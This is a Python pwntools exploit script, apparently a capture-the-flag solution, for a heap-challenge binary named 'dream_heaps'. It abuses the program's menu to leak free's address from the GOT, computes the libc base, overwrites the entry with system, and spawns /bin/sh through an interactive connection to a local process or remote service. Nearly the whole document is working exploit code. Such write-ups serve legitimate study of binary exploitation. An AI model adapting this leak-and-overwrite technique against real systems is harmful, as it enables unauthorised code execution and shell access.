#!/usr/bin/env python3

from pwn import *

exe = ELF("./dream_heaps")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    WRITE = "1"
    READ = "2"
    EDIT = "3"
    DELETE = "4"

    #gdb.attach(r, gdbscript = 'b *0x0000000000400862')
    r.sendline(DELETE) # lazy binding
    r.sendline("0")

    r.sendline(WRITE)
    r.sendline(str(exe.got['free']))
    r.sendline("A" * exe.got['free'])

    r.sendline(WRITE)
    r.sendline("0")
    r.send("\n")

    r.sendline(WRITE)
    r.sendline("7")
    r.sendline("/bin/sh")

    for i in range(5):
    	r.sendline(WRITE)
    	r.sendline("8") # length
    	r.sendline("A" * 8)

    r.sendline(READ)
    r.sendline("8")

    r.recvuntil("Which dream would you like to read?\n")
    leak = u64(r.recvn(6) + "\x00\x00")
    log.info("leak: {}".format(hex(leak)))
    libc.address = leak - libc.symbols['free']

    gdb.attach(r, gdbscript = 'b *0x400993')
    r.sendline(EDIT)
    r.sendline("8")
    r.sendline(str(libc.symbols['system']))

    r.interactive()


if __name__ == "__main__":
    main()
'''
index val
edit the len
'''